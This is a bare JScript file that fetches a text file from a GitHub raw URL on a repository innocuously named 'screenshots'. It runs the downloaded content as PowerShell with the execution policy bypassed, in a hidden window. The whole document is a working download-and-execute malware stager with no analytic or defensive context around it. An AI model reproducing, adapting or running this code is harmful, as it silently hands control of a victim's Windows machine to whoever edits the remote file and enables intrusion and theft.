var x=new ActiveXObject("MSXML2.XMLHTTP");
x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/init.txt",0);
x.send();
var cmd="powershell -ExecutionPolicy Bypass -Command \""+x.responseText.replace(/\n/g,";")+"\"";
new ActiveXObject("WScript.Shell").Run(cmd,0);
